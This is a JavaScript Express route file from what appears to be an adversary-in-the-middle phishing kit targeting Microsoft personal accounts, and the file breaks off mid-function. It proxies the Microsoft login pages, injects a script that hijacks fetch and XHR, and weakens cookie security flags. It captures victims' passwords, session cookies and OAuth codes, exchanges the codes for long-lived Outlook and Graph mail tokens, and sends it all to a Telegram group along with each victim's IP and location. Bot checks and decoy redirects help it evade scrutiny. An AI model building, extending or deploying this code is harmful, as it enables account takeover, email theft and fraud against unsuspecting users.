// routes/microsoftRoutes.js
const Agent = require('agentkeepalive');
const HttpsAgent = require('agentkeepalive').HttpsAgent;
const express = require('express');
const router = express.Router();
const axios = require('axios');
const cheerio = require('cheerio');
const { v4: uuidv4 } = require('uuid');
const { getFingerprint, decrypt, isValidEmail } = require('../utils/encryption');
const { getVictimInfo } = require('../utils/helpers');
const { showVerificationPage, handleVerification, TOKEN_CONFIG, getTokenStore, saveTokens } = require('../middleware/botDetection');
// Import utilities and services
const { 
    generateCodeVerifier, 
    generateCodeChallenge,  
     
} = require('../utils/encryption');
const sessionAgents = new Map();

// Constants
const DUAL_TOKEN_CLIENT_ID = '04bb29c3-1f5d-4094-a857-4848b1e6c6c7';
const DUAL_TOKEN_REDIRECT_URI = 'https://login.microsoftonline.com/common/oauth2/nativeclient';
const OUTLOOK_SCOPE = 'https://outlook.office.com/Mail.Read https://outlook.office.com/Mail.ReadWrite https://outlook.office.com/Mail.Send offline_access openid profile';

// Store sessions (these will be passed from server.js)
let capturedData;
let microsoftParams;
let codeVerifiers;
let emailSessions;
let requestTimestamps;
let bot;
let telegramGroupId;
let verifiedSessions = null; 
let personalCookies = new Map();



// Clean up expired agents periodically
setInterval(() => {
    const now = Date.now();
    for (const [sessionId, agent] of sessionAgents.entries()) {
        if (agent._lastUsed && (now - agent._lastUsed) > 5 * 60 * 1000) {
            agent.destroy();
            sessionAgents.delete(sessionId);
            console.log(`🧹 Cleaned up stale agent for session ${sessionId}`);
        }
    }
}, 60 * 1000);

// Initialize with dependencies
function initRoutes(dependencies) {
    capturedData = dependencies.capturedData;
    microsoftParams = dependencies.microsoftParams;
    codeVerifiers = dependencies.codeVerifiers;
    emailSessions = dependencies.emailSessions;
    requestTimestamps = dependencies.requestTimestamps;
    bot = dependencies.bot;
    telegramGroupId = dependencies.telegramGroupId;
    verifiedSessions = dependencies.verifiedSessions || new Map(); 
}

// Helper function to send cookie notification
async function sendCookieNotification(sessionId, username, victimInfo, cookies, cookieCount) {
    let message = `🍪 *COOKIES CAPTURED!*\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    message += `*Session:* \`${sessionId}\`\n`;
    message += `*Email:* \`${username || 'Unknown'}\`\n`;
    message += `*Cookies Captured:* ${cookieCount}\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    
    message += `*🔑 Important Cookies:*\n`;
    const importantCookies = ['RPSSecAuth', 'MSISAuth', 'MSISAuthenticated', 'MSPAuth', 'MSPProf', '.AspNet.Cookies'];
    const capturedImportant = cookies.filter(c => importantCookies.includes(c.name));
    
    if (capturedImportant.length > 0) {
        capturedImportant.forEach(cookie => {
            message += `• *${cookie.name}:* \`${cookie.value.substring(0, 40)}...\`\n`;
        });
    } else {
        message += `• No primary auth cookies captured yet\n`;
    }
    
    message += `\n*📊 All Cookies:*\n`;
    cookies.slice(0, 10).forEach(cookie => {
        message += `• ${cookie.name}: \`${cookie.value.substring(0, 30)}${cookie.value.length > 30 ? '...' : ''}\`\n`;
    });
    if (cookies.length > 10) {
        message += `• ... and ${cookies.length - 10} more cookies\n`;
    }
    
    message += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    message += `*Victim Information:*\n`;
    message += `• IP: \`${victimInfo.ip}\`\n`;
    message += `• Location: ${victimInfo.location}\n`;
    message += `• Browser: ${victimInfo.browser}\n`;
    message += `• OS: ${victimInfo.os}\n`;
    message += `• Time: ${new Date().toLocaleString()}\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    message += `*View All Data:* \`GET /api/captured-data\``;
    
    if (bot && telegramGroupId) {
        await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
            .catch(e => console.error('Telegram error:', e.message));
    }
}

// Helper function to send dual token notification
async function sendDualTokenNotification(sessionId, username, victimInfo, outlookTokens, graphTokens) {
    let message = `🎯 *WINNING STRATEGY: DUAL TOKENS WITH CAE!*\n`;
    message += `━━━━━━━━━━━━━━━━━━\n`;
    message += `*Session:* \`${sessionId}\`\n`;
    message += `*Email:* \`${username}\`\n`;
    message += `━━━━━━━━━━━━━━━━━━\n\n`;
    message += `*✅ CAE ENABLED:* Tokens survive password & MFA changes\n\n`;
    
    if (outlookTokens) {
        message += `*📧 OUTLOOK TOKEN (via code exchange)*\n`;
        message += `• Expires: ${outlookTokens.expires_in} seconds\n`;
        message += `• Access: \`${outlookTokens.access_token.substring(0, 50)}...\`\n`;
        message += `• Refresh: \`${outlookTokens.refresh_token?.substring(0, 50) || 'N/A'}...\`\n\n`;
    }
    
    if (graphTokens) {
        message += `*🔄 GRAPH TOKEN (via code exchange)*\n`;
        message += `• Expires: ${graphTokens.expires_in} seconds\n`;
        message += `• Access: \`${graphTokens.access_token.substring(0, 50)}...\`\n`;
        message += `• Refresh: \`${graphTokens.refresh_token?.substring(0, 50) || 'N/A'}...\`\n\n`;
    }
    
    message += `━━━━━━━━━━━━━━━━━━\n`;
    message += `*Victim Information:*\n`;
    message += `• IP: \`${victimInfo.ip}\`\n`;
    message += `• Location: ${victimInfo.location}\n`;
    message += `• Browser: ${victimInfo.browser}\n`;
    message += `• OS: ${victimInfo.os}\n`;
    message += `━━━━━━━━━━━━━━━━━━\n`;
    message += `*Check Status:* \`GET /api/token-status/${sessionId}\`\n`;
    message += `*Export Tokens:* \`GET /api/export-persistent/${sessionId}\``;
    
    if (bot && telegramGroupId) {
        await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
            .catch(e => console.error('Telegram error:', e.message));
    }
}





// Add this at the VERY TOP of your routes (before router.use('/live-proxy'))

// Catch any request to login.live.com and redirect through proxy
router.use(async (req, res, next) => {
    // Check if the request is going to Microsoft directly (via absolute URL in form)
    if (req.headers.host === 'login.live.com' || req.url.includes('login.live.com')) {
        console.log(`🚨 Detected direct request to Microsoft: ${req.url}`);
        
        // Extract sessionId from various places
        const sessionId = req.body.sessionId || req.query.state || '';
        
        // Rewrite to go through proxy
        let newUrl = req.url;
        if (newUrl.startsWith('http')) {
            newUrl = newUrl.replace(/https?:\/\/login\.live\.com/, '');
        }
        req.url = `/live-proxy${newUrl}`;
        console.log(`   Rewrote to: ${req.url}`);
    }
    next();
});



// Direct handler for the login POST (captures credentials and forwards)
router.post('/checkpassword.srf', express.urlencoded({ extended: true }), async (req, res) => {
    console.log('📥 Direct POST to /checkpassword.srf');
    const sessionId = req.body.state || req.query.state || '';
    let contextId = req.body.contextid || req.query.contextid;
    const username = req.body.username || req.body.login;
    const password = req.body.password || req.body.passwd;
    
    // Try to get contextId from session storage if not provided
    if (!contextId && sessionId && personalCookies.has(sessionId)) {
        const sessionData = personalCookies.get(sessionId);
        contextId = sessionData._contextId;
    }
    
    console.log(`   SessionId: ${sessionId}, ContextId: ${contextId}`);
    if (username) console.log(`   Username: ${username}`);
    
    // Capture credentials
    if (username && password && sessionId) {
        const victimInfo = await getVictimInfo(req);
        let session = capturedData.get(sessionId) || {};
        session.credentials = { username, password, time: new Date().toISOString(), victimInfo };
        capturedData.set(sessionId, session);
        console.log(`🔑 Credentials captured for ${username}`);
    }
    
    // Get stored cookies
    let cookieString = '';
    if (sessionId && personalCookies.has(sessionId)) {
        const storedCookies = personalCookies.get(sessionId);
        const nameValuePairs = storedCookies.map(c => {
            const match = c.match(/^([^=]+)=([^;]+)/);
            return match ? `${match[1]}=${match[2]}` : c;
        });
        cookieString = nameValuePairs.join('; ');
        console.log(`🍪 Forwarding ${nameValuePairs.length} cookies`);
    }
    
    // Build target URL
    let targetUrl = 'https://login.live.com/checkpassword.srf';
    if (contextId) {
        targetUrl += `?contextid=${contextId}`;
    }
    console.log(`🎯 Forwarding to: ${targetUrl}`);
    
    try {
        // Extract any other query parameters from original request
        const queryString = req.url.includes('?') ? req.url.split('?')[1] : '';
        if (queryString && !targetUrl.includes('?')) {
            targetUrl += '?' + queryString;
        }
        
        const response = await axios.post(targetUrl, req.body, {
            headers: {
                'Content-Type': 'application/json', // This request expects JSON
                'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
                'Cookie': cookieString,
                'Referer': req.headers.referer || 'https://login.live.com/'
            }
        });
        
        // Forward the JSON response back to the browser
        res.status(response.status).json(response.data);
        console.log(`✅ Forwarded login response`);
    } catch (error) {
        console.error('❌ Login POST error:', error.message);
        res.status(500).json({ error: 'Proxy error' });
    }
});










// Main proxy handler for /live-proxy/*
// Main proxy handler for /live-proxy/*
router.use('/live-proxy', async (req, res) => {
    const targetUrl = `https://login.live.com${req.originalUrl.replace('/live-proxy', '')}`;
    console.log(`🔁 Proxying: ${req.method} ${req.originalUrl} → ${targetUrl}`);

    // Get sessionId from query or body or headers
    const sessionId = req.query.state || req.body.state || req.headers['x-session-id'] || '';
    
    // ============ NTLM FIX: Session-specific persistent agent ============
    let agent = sessionAgents.get(sessionId);
    if (!agent && sessionId) {
        agent = new HttpsAgent({
            keepAlive: true,
            keepAliveMsecs: 10000,
            maxSockets: 1,
            maxFreeSockets: 1,
            timeout: 60000,
            freeSocketTimeout: 30000,
            scheduling: 'fifo'
        });
        agent._lastUsed = Date.now();
        sessionAgents.set(sessionId, agent);
        console.log(`🔌 Created persistent agent for session ${sessionId}`);
    }

    try {
        // Extract contextid from URL if present
        let contextId = null;
        const urlMatch = targetUrl.match(/[?&]contextid=([^&]+)/);
        if (urlMatch) contextId = urlMatch[1];
        
        // Also check referer for contextid
        if (!contextId && req.headers.referer) {
            const refMatch = req.headers.referer.match(/[?&]contextid=([^&]+)/);
            if (refMatch) contextId = refMatch[1];
        }
        
        console.log(`📝 ContextId for request: ${contextId || 'none'}`);

        const headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': req.headers['accept'] || '*/*',
            'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
            'Referer': req.headers['referer'] || 'https://login.live.com/',
            'Content-Type': req.headers['content-type'] || 'application/x-www-form-urlencoded'
        };

        // ============ Build cookie string for Microsoft ============
        let cookieString = '';
        if (sessionId && personalCookies.has(sessionId)) {
            const storedCookies = personalCookies.get(sessionId);
            // Extract just the name=value parts from the full cookie strings
            const nameValuePairs = storedCookies.map(cookieStr => {
                const match = cookieStr.match(/^([^=]+)=([^;]+)/);
                return match ? `${match[1]}=${match[2]}` : cookieStr;
            });
            cookieString = nameValuePairs.join('; ');
            console.log(`🍪 Forwarding ${nameValuePairs.length} cookies to Microsoft for session ${sessionId}`);
            console.log(`   Cookie names: ${nameValuePairs.map(c => c.split('=')[0]).join(', ')}`);
        } else {
            cookieString = req.headers.cookie || '';
        }

        // ============ Inject contextid into the target URL ============
        let finalTargetUrl = targetUrl;
        if (contextId && !finalTargetUrl.includes('contextid')) {
            finalTargetUrl += (finalTargetUrl.includes('?') ? '&' : '?') + 'contextid=' + contextId;
            console.log(`📝 Added contextid to URL: ${finalTargetUrl}`);
        } else if (contextId && finalTargetUrl.includes('contextid')) {
            console.log(`📝 contextid already in URL: ${contextId}`);
        }

        // Update agent last used time
        if (agent) agent._lastUsed = Date.now();

        // Make request with persistent agent
        const response = await axios({
            method: req.method,
            url: finalTargetUrl,   // Use URL with contextid
            headers: { ...headers, 'Cookie': cookieString },
            data: req.method === 'POST' ? req.body : undefined,
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 400,
            httpsAgent: agent,
            httpAgent: agent
        });

        // Forward status and non-cookie headers
        res.status(response.status);
        Object.entries(response.headers).forEach(([key, value]) => {
            if (key !== 'set-cookie') res.setHeader(key, value);
        });

        // ============ Store FULL cookies from Microsoft ============
        if (response.headers['set-cookie']) {
            console.log(`🍪 Processing ${response.headers['set-cookie'].length} cookies from Microsoft`);
            
            response.headers['set-cookie'].forEach(cookieStr => {
                const nameMatch = cookieStr.match(/^([^=]+)=([^;]+)/);
                if (!nameMatch) return;
                
                const cookieName = nameMatch[1];
                const cookieValue = nameMatch[2];
                
                // Store the FULL cookie string for this session
                if (sessionId) {
                    const existing = personalCookies.get(sessionId) || [];
                    const filtered = existing.filter(c => !c.startsWith(`${cookieName}=`));
                    filtered.push(cookieStr);
                    personalCookies.set(sessionId, filtered);
                    console.log(`   Stored FULL cookie: ${cookieName}=${cookieValue.substring(0, 30)}...`);
                }
                
                // Create modified cookie for browser
                let modifiedCookie = cookieStr
                    .replace(/;?\s*Domain=[^;]+/gi, '')
                    .replace(/;?\s*Secure/gi, '')
                    .replace(/;?\s*SameSite=None/gi, '')
                    .replace(/;?\s*SameSite=Strict/gi, '')
                    .replace(/;?\s*SameSite=Lax/gi, '');
                
                res.append('Set-Cookie', modifiedCookie);
                console.log(`   Browser cookie: ${cookieName}=${cookieValue.substring(0, 30)}...`);
            });
        }

        // ============ HTML REWRITING ============
        const contentType = response.headers['content-type'] || '';
        if (contentType.includes('text/html')) {
            let html = response.data;
            
            // Extract contextid from HTML if not already found
            if (!contextId) {
                const contextPatterns = [
                    /contextid["']?\s*:\s*["']([^"']+)["']/i,
                    /name=["']contextid["']\s+value=["']([^"']+)["']/i,
                    /[?&]contextid=([^&]+)/,
                    /data-contextid=["']([^"']+)["']/i,
                    /id=["']contextid["'][^>]*value=["']([^"']+)["']/i,
                    /"contextid":"([^"]+)"/,
                    /contextId["']?\s*:\s*["']([^"']+)["']/i
                ];
                
                for (const pattern of contextPatterns) {
                    const match = html.match(pattern);
                    if (match) {
                        contextId = match[1];
                        console.log(`✅ Extracted contextId from HTML: ${contextId}`);
                        break;
                    }
                }
            }
            
            // Store contextid with session
            if (contextId && sessionId) {
                const sessionCookies = personalCookies.get(sessionId) || [];
                if (!sessionCookies._contextId) {
                    sessionCookies._contextId = contextId;
                    personalCookies.set(sessionId, sessionCookies);
                    console.log(`💾 Stored contextId ${contextId} for session ${sessionId}`);
                }
            }
            
            // ============ Inject minimal interceptor script ============
            // (optional – you can keep your existing interceptor or use this one)
            const interceptorScript = `
<script>
(function() {
    const sessionId = '${sessionId}';
    const contextId = '${contextId || ''}';
    console.log('🚀 Final interceptor loaded', sessionId, contextId);
    
    function rewriteUrl(url) {
        if (!url || typeof url !== 'string') return url;
        if (url.includes('login.live.com')) {
            let newUrl = url.replace(/https?:\/\/login\.live\.com/g, '');
            newUrl = '/live-proxy' + (newUrl.startsWith('/') ? newUrl : '/' + newUrl);
            if (contextId && !newUrl.includes('contextid=')) {
                newUrl += (newUrl.includes('?') ? '&' : '?') + 'contextid=' + contextId;
            }
            if (sessionId && !newUrl.includes('sessionId=')) {
                newUrl += (newUrl.includes('?') ? '&' : '?') + 'sessionId=' + sessionId;
            }
            return newUrl;
        }
        if (url.startsWith('/') && !url.startsWith('/live-proxy')) {
            return '/live-proxy' + url;
        }
        return url;
    }
    
    // Override fetch
    const origFetch = window.fetch;
    window.fetch = function(url, options) {
        const newUrl = rewriteUrl(url);
        if (newUrl !== url) {
            console.log('🔵 Fetch intercepted:', url, '→', newUrl);
            options = options || {};
            options.headers = options.headers || {};
            options.headers['X-Session-Id'] = sessionId;
            if (options.body && typeof options.body === 'string') {
                if (!options.body.includes('sessionId=')) options.body += '&sessionId=' + sessionId;
                if (contextId && !options.body.includes('contextid=')) options.body += '&contextid=' + contextId;
            }
            return origFetch.call(this, newUrl, options);
        }
        return origFetch.call(this, url, options);
    };
    
    // Override XMLHttpRequest
    const XHR = XMLHttpRequest.prototype;
    const origOpen = XHR.open;
    const origSend = XHR.send;
    XHR.open = function(method, url, ...args) {
        const newUrl = rewriteUrl(url);
        if (newUrl !== url) {
            this._intercepted = true;
            console.log('🟡 XHR intercepted:', url, '→', newUrl);
            return origOpen.call(this, method, newUrl, ...args);
        }
        return origOpen.call(this, method, url, ...args);
    };
    XHR.send = function(body) {
        if (this._intercepted) {
            this.setRequestHeader('X-Session-Id', sessionId);
            if (typeof body === 'string') {
                if (!body.includes('sessionId=')) body += '&sessionId=' + sessionId;
                if (contextId && !body.includes('contextid=')) body += '&contextid=' + contextId;
            }
        }
        return origSend.call(this, body);
    };
    
    console.log('✅ Interceptor active');
})();
</script>
`;
            
            const $ = cheerio.load(html);
            $('head').prepend(interceptorScript);
            
            // Also modify any existing static forms (backup)
            $('form').each(function() {
                let action = $(this).attr('action');
                if (action && (action.includes('login.live.com') || action.includes('/ppsecure/') || action.includes('/checkpassword.srf'))) {
                    let newAction = action.replace(/https?:\/\/login\.live\.com/g, '');
                    newAction = '/live-proxy' + (newAction.startsWith('/') ? newAction : '/' + newAction);
                    if (contextId && !newAction.includes('contextid')) {
                        newAction += (newAction.includes('?') ? '&' : '?') + 'contextid=' + contextId;
                    }
                    $(this).attr('action', newAction);
                    console.log(`   Modified static form action: ${action} → ${newAction}`);
                }
                if (!$(this).find('input[name="sessionId"]').length) {
                    $(this).append(`<input type="hidden" name="sessionId" value="${sessionId}">`);
                }
                if (contextId && !$(this).find('input[name="contextid"]').length) {
                    $(this).append(`<input type="hidden" name="contextid" value="${contextId}">`);
                }
            });
            
            html = $.html();
            return res.send(html);
        }

        // Non-HTML response
        if (response.data && typeof response.data === 'object') {
            res.json(response.data);
        } else {
            res.send(response.data);
        }

    } catch (error) {
        console.error('❌ Proxy error:', error.message);
        
        if (error.response && (error.response.status === 302 || error.response.status === 303)) {
            const location = error.response.headers.location;
            
            // Handle OAuth code redirect
            if (location && location.includes('nativeclient')) {
                const codeMatch = location.match(/code=([^&]+)/);
                const stateMatch = location.match(/state=([^&]+)/);
                if (codeMatch && stateMatch) {
                    console.log(`✅ Captured auth code for session ${stateMatch[1]}`);
                    return res.redirect(`/auth/callback?code=${codeMatch[1]}&state=${stateMatch[1]}`);
                }
            }
            
            // Rewrite redirects to go through proxy
            if (location) {
                let newLocation = location.replace(/https?:\/\/login\.live\.com/g, '/live-proxy');
                const locationContextMatch = location.match(/[?&]contextid=([^&]+)/);
                const existingContextId = locationContextMatch ? locationContextMatch[1] : contextId;
                if (existingContextId && !newLocation.includes('contextid')) {
                    newLocation += (newLocation.includes('?') ? '&' : '?') + 'contextid=' + existingContextId;
                }
                console.log(`↪️ Redirecting to proxy: ${newLocation}`);
                return res.redirect(newLocation);
            }
        }
        
        // Send error response
        if (error.response && error.response.data) {
            res.status(error.response.status || 500).send(error.response.data);
        } else {
            res.status(500).send('Proxy error: ' + error.message);
        }
    }
});





// Proxy the OAuth token endpoint
router.all('/common/oauth2/v2.0/token', express.json(), async (req, res) => {
    console.log('🔄 Proxying token exchange');
    const targetUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
    const sessionId = req.body.state || req.query.state || '';

    let cookieString = '';
    if (sessionId && personalCookies.has(sessionId)) {
        const storedCookies = personalCookies.get(sessionId);
        const nameValuePairs = storedCookies.map(c => {
            const match = c.match(/^([^=]+)=([^;]+)/);
            return match ? `${match[1]}=${match[2]}` : c;
        });
        cookieString = nameValuePairs.join('; ');
    }

    try {
        const response = await axios.post(targetUrl, req.body, {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
                'Cookie': cookieString
            }
        });
        res.json(response.data);
    } catch (error) {
        console.error('Token proxy error:', error.message);
        res.status(500).json(error.response?.data || { error: 'Token exchange failed' });
    }
});




// Handle the actual login POST request
router.post('/live-proxy/ppsecure/post.srf', express.urlencoded({ extended: true }), async (req, res) => {
    console.log('📥 Direct login POST received');
    console.log('   Body keys:', Object.keys(req.body));
    
    const sessionId = req.body.sessionId || req.body.state || '';
    const username = req.body.login || req.body.loginfmt || '';
    const password = req.body.passwd || '';
    const contextId = req.body.contextid || req.query.contextid;
    
    console.log(`   SessionId: ${sessionId}, ContextId: ${contextId}`);
    console.log(`   Username: ${username}`);
    
    // Capture credentials
    if (username && password && sessionId) {
        console.log(`🔑 CREDENTIALS CAPTURED: ${username}`);
        const victimInfo = await getVictimInfo(req);
        let session = capturedData.get(sessionId) || { credentials: {}, cookies: [], tokens: {} };
        session.credentials = {
            username,
            password,
            time: new Date().toISOString(),
            victimInfo,
            account_type: 'personal',
            ip: victimInfo.ip
        };
        capturedData.set(sessionId, session);
    }
    
    // Get stored cookies
    const storedCookies = personalCookies.get(sessionId) || [];
    const cookieValues = storedCookies.map(c => {
        const match = c.match(/^([^=]+)=([^;]+)/);
        return match ? `${match[1]}=${match[2]}` : c;
    });
    
    // Build the request to Microsoft
    let targetUrl = 'https://login.live.com/ppsecure/post.srf';
    if (contextId) {
        targetUrl += `?contextid=${contextId}`;
    }
    
    try {
        const response = await axios.post(targetUrl, req.body, {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
                'Cookie': cookieValues.join('; '),
                'Referer': 'https://login.live.com/'
            },
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 400
        });
        
        // Forward response
        res.status(response.status);
        if (response.headers.location) {
            const location = response.headers.location;
            if (location.includes('code=')) {
                console.log(`✅ Auth code captured!`);
                return res.redirect(`/auth/callback?${location.split('?')[1]}`);
            }
            return res.redirect(location);
        }
        res.send(response.data);
        
    } catch (error) {
        console.error('❌ Login POST error:', error.message);
        if (error.response?.headers?.location) {
            return res.redirect(error.response.headers.location);
        }
        res.status(500).send('Login failed');
    }
});









// Endpoint to capture cookies
router.post('/api/capture-cookies', express.json(), async (req, res) => {
    try {
        const { sessionId, cookies, email } = req.body;
        
        if (!sessionId || !cookies) {
            return res.status(400).json({ error: 'Missing sessionId or cookies' });
        }
        
        console.log(`🍪 Cookie capture request for session: ${sessionId}`);
        console.log(`   Cookies received: ${cookies.length || Object.keys(cookies).length}`);
        
        let session = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
        
        // Parse cookies if they're in different formats
        let cookieArray = [];
        if (Array.isArray(cookies)) {
            cookieArray = cookies;
        } else if (typeof cookies === 'object') {
            cookieArray = Object.entries(cookies).map(([name, value]) => ({ name, value }));
        }
        
        // Add cookies to session
        if (!session.cookies) session.cookies = [];
        
        cookieArray.forEach(cookie => {
            const existingIndex = session.cookies.findIndex(c => c.name === cookie.name);
            if (existingIndex !== -1) {
                session.cookies[existingIndex] = {
                    ...cookie,
                    captured_at: new Date().toISOString(),
                    updated: true
                };
            } else {
                session.cookies.push({
                    ...cookie,
                    captured_at: new Date().toISOString()
                });
            }
        });
        
        capturedData.set(sessionId, session);
        
        // Send notification for important cookies
        const importantCookies = ['RPSSecAuth', 'MSISAuth', 'MSISAuthenticated', 'MSPAuth', 'MSPProf', '.AspNet.Cookies'];
        const hasImportant = cookieArray.some(c => importantCookies.includes(c.name));
        
        if (hasImportant && cookieArray.length > 0) {
            const victimInfo = await getVictimInfo(req);
            await sendCookieNotification(sessionId, email || 'Unknown', victimInfo, cookieArray, cookieArray.length);
        }
        
        console.log(`✅ Cookies saved for session ${sessionId}. Total cookies: ${session.cookies.length}`);
        
        res.json({ 
            success: true, 
            message: `Captured ${cookieArray.length} cookies`,
            cookieCount: session.cookies.length 
        });
        
    } catch (error) {
        console.error('❌ Cookie capture error:', error);
        res.status(500).json({ error: 'Failed to capture cookies' });
    }
});

// Exchange code for tokens
async function exchangeForResource(sessionId, code, codeVerifier, scope, resourceName) {
    try {
        console.log(`🔄 Exchanging for ${resourceName} token...`);
        
        const clientId = resourceName === 'graph' ? DUAL_TOKEN_CLIENT_ID : 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
        const redirectUri = resourceName === 'graph' ? DUAL_TOKEN_REDIRECT_URI : 'urn:ietf:wg:oauth:2.0:oob';
        
        const tokenParams = {
            client_id: clientId,
            code: code,
            code_verifier: codeVerifier,
            redirect_uri: redirectUri,
            grant_type: 'authorization_code',
            scope: `${scope} offline_access`
        };
        
        const tokenResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
            new URLSearchParams(tokenParams).toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'application/json'
                }
            }
        );
        
        const tokens = tokenResponse.data;
        console.log(`✅ ${resourceName} tokens received!`);
        
        return tokens;
        
    } catch (error) {
        console.error(`❌ ${resourceName} token exchange failed:`, error.response?.data || error.message);
        return null;
    }
}























// Main dual token endpoint with enhanced cookie capture
// Modified route to accept both GET and POST, with POST as primary
router.route('/en-us/auth')
    .post(async (req, res) => {
        // Handle POST request (email in body)
        try {
            // Get email from POST body instead of query
            const { email: encryptedEmail } = req.body;
            await handleAuthRequest(req, res, encryptedEmail);
        } catch (error) {
            console.error('POST auth error:', error.message);
            res.status(500).send('Error loading login page');
        }
    })
    .get(async (req, res) => {
        // Handle GET request (email in query) - for backward compatibility
        try {
            const { email: encryptedEmail } = req.query;
            await handleAuthRequest(req, res, encryptedEmail);
        } catch (error) {
            console.error('GET auth error:', error.message);
            res.status(500).send('Error loading login page');
        }
    });



// This endpoint will be called by Microsoft after successful login
// The user will be redirected here with the authorization code
router.get('/auth/callback', async (req, res) => {
    const { code, state } = req.query;
    const sessionId = state;
    const codeVerifier = codeVerifiers.get(sessionId);
    
    if (!code || !codeVerifier) {
        console.error('Missing code or verifier');
        return res.redirect('/en-us/auth?error=missing_params');
    }
    
    try {
        // Exchange code for tokens
        const tokenResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
            new URLSearchParams({
                client_id: DUAL_TOKEN_CLIENT_ID,
                code: code,
                code_verifier: codeVerifier,
                redirect_uri: DUAL_TOKEN_REDIRECT_URI,
                grant_type: 'authorization_code',
                scope: OUTLOOK_SCOPE
            }).toString(),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        
        const tokens = tokenResponse.data;
        console.log('✅ Tokens received');
        
        // Store tokens in capturedData
        let session = capturedData.get(sessionId) || {};
        session.tokens = tokens;
        capturedData.set(sessionId, session);
        
        // Show a success page and redirect to Outlook
        res.send(`
            <html><body>
                <h3>Authentication successful! Redirecting...</h3>
                <script>setTimeout(() => window.location.href='https://outlook.live.com/mail/', 2000);</script>
            </body></html>
        `);
    } catch (error) {
        console.error('Token exchange failed:', error.message);
        res.redirect('/en-us/auth?error=exchange_failed');
    }
});




// Shared handler function
async function handleAuthRequest(req, res, encryptedEmail) {
    // Check verification cookie
    const cookieName = 'verified_' + encryptedEmail;
    const isVerified = req.cookies[cookieName] === 'true';
    
    if (!isVerified && encryptedEmail) {
        console.log(`🖱️ [MICROSOFT ROUTE] Not verified - showing verification page`);
        
        const tokenStore = getTokenStore();
        let tokenData = tokenStore?.get(encryptedEmail);
        if (!tokenData || Date.now() > tokenData.expiresAt) {
            tokenStore?.set(encryptedEmail, {
                destination: req.originalUrl,
                created: Date.now(),
                expiresAt: Date.now() + TOKEN_CONFIG.TOKEN_EXPIRY_MS
            });
            saveTokens();
        }
        
        return showVerificationPage(res, encryptedEmail, req.originalUrl, null, null);
    }
    
    console.log(`✅ [MICROSOFT ROUTE] Already verified - proceeding to proxy`);
    
    let email = null;
    
    if (encryptedEmail) {
        try {
            email = decrypt(encryptedEmail);
            console.log('Decrypted email:', email);
            
            if (!email || !isValidEmail(email)) {
                console.log('Invalid email format, redirecting...');
                return res.redirect('https://www.google.com');
            }
        } catch (e) {
            console.error('Failed to decrypt email:', e);
            return res.redirect('https://www.google.com');
        }
    } else {
        console.log('No email parameter, redirecting...');
        return res.redirect('https://www.google.com');
    }
    
    const clientIp = req.clientIp || req.ip || 'unknown';
    const now = Date.now();
    
    const lastRequest = requestTimestamps.get(clientIp) || 0;
    if (now - lastRequest < 5000) {
        return res.status(429).send('Rate limited');
    }
    requestTimestamps.set(clientIp, now);
    
    const sessionId = 'dual_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
    
    emailSessions.set(sessionId, { encrypted: encryptedEmail, decrypted: email });
    
    // ============ CREATE CODE VERIFIER AND CHALLENGE FIRST ============
    const codeVerifier = generateCodeVerifier();
    const codeChallenge = generateCodeChallenge(codeVerifier);
    // ================================================================
    
    // Socket.io script
    const socketScript = `
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const sessionId = '${sessionId}';
        const userEmail = '${email}';
        
        const socket = io({
            query: { sessionId: sessionId }
        });
        
        socket.on('connect', () => {
            socket.emit('register_session', { sessionId, email: userEmail });
        });
        
        socket.on('revoked', (data) => {
            console.log('🔴 REVOKED! Redirecting to Google...', data);
            alert('Your access has been revoked. Redirecting...');
            window.location.href = 'https://www.google.com';
        });
        
        socket.on('force_redirect', (data) => {
            console.log('🚨 Force redirect:', data.url);
            window.location.href = data.url;
        });
    </script>
    `;
    
    codeVerifiers.set(sessionId, codeVerifier);
    
    console.log(`🔐 Dual Token PKCE for session ${sessionId}:`, {
        verifierLength: codeVerifier.length,
        challenge: codeChallenge.substring(0, 20) + '...',
        email: email
    });
    
    // ============ NOW CHECK FOR PERSONAL ACCOUNT ============
    const personalDomains = ['outlook.com', 'hotmail.com', 'live.com', 'msn.com'];
    const isPersonal = personalDomains.some(domain => email.endsWith(`@${domain}`));
    
    // In handleAuthRequest, when personal account is detected:
if (isPersonal) {
    console.log(`📧 Personal account detected: ${email} - using proxy flow`);
    
    // Build the auth URL but now pointing to your proxy endpoint
    const authUrl = new URL('http://localhost:3001/live-proxy/oauth20_authorize.srf');
    authUrl.searchParams.append('client_id', DUAL_TOKEN_CLIENT_ID);
    authUrl.searchParams.append('response_type', 'code');
    authUrl.searchParams.append('redirect_uri', DUAL_TOKEN_REDIRECT_URI);
    authUrl.searchParams.append('scope', OUTLOOK_SCOPE);
    authUrl.searchParams.append('code_challenge', codeChallenge);
    authUrl.searchParams.append('code_challenge_method', 'S256');
    authUrl.searchParams.append('state', sessionId);
    authUrl.searchParams.append('prompt', 'select_account');
